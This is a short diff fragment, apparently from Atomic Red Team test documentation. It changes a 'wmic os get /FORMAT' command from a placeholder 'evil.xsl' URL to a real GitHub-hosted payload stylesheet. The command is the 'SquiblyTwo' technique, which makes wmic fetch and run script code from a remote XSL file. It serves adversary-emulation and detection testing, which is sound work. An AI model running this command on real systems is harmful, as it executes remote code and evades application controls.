@@ -52,4 +52,4 @@ Input:
 
 Input:
 
-    wmic os get /FORMAT:”https:///evil.xsl”
+    wmic os get /FORMAT:”https://raw.githubusercontent.com/redcanaryco/atomic-red-team/squiblytwo/Windows/Payloads/squiblytwo/minimalist.xsl”
